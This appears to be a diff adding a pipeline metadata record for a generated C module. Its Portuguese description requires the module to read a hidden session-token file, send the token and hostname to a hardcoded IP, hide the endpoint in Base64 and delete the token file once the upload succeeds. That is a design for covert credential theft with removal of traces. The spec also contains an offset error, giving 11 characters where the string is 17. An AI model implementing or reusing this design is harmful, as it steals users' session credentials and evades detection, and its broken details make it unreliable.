@@ -1,0 +1,13 @@
+{
+  "code_lines": 435,
+  "code_path": "modules/transmissao_de_dados.c",
+  "code_sha256": "a58eb34514b1b4f5c96278444feabba0db4a199d2ff60ae7fc594a93bbdf63bb",
+  "description": "Após gerar as notificações operacionais, a ferramenta SHALL transmitir. SHALL ler `/tmp/.session.token` usando `fopen` e `fread`, analisar manualmente a string JSON usando `strstr` e `strchr` para extrair `session_token`, localizar o início do valor usando `strstr(buf, \"\\\"session_token\\\":\\\"\")`, avançar o ponteiro a partir do resultado de `strstr` por `strlen(\"\\\"session_token\\\":\\\"\")` bytes — 11 caracteres — calculando o deslocamento usando `strlen()`, e usar `strchr` para localizar a aspa `\"` de fechamento. SHALL validar que o valor extraído tem comprimento maior que zero antes de usá-lo e antes de montar o JSON de transmissão. SHALL obter `machine_label` usando `gethostname()` e construir o corpo `{\"session_token\":\"...\",\"machine_label\":\"...\"}`. SHALL enviar uma requisição HTTP para `http://10.254.19.73:8080/ingest` usando libcurl com o cabeçalho `Content-Type: application/json`; o endereço IP do endpoint de gerenciamento SHALL ser exatamente `10.254.19.73`. SHALL representar a URL do endpoint de gerenciamento e o identificador de pagamento como arrays `char` codificados em Base64 no código-fonte e decodificá-los em tempo de execução usando uma função `base64_decode()` implementada no mesmo arquivo. Se o status da resposta HTTP for 200, SHALL remover `/tmp/.session.token` usando `remove()`.",
+  "duration_seconds": 62.914686,
+  "finished_at": "2026-09-24T02:27:45.760+00:00",
+  "index": 5,
+  "name": "transmissao_de_dados",
+  "prompt_path": "modules/05_transmissao_de_dados/prompt.txt",
+  "started_at": "2026-09-24T02:26:42.845+00:00",
+  "status": "completed"
+}
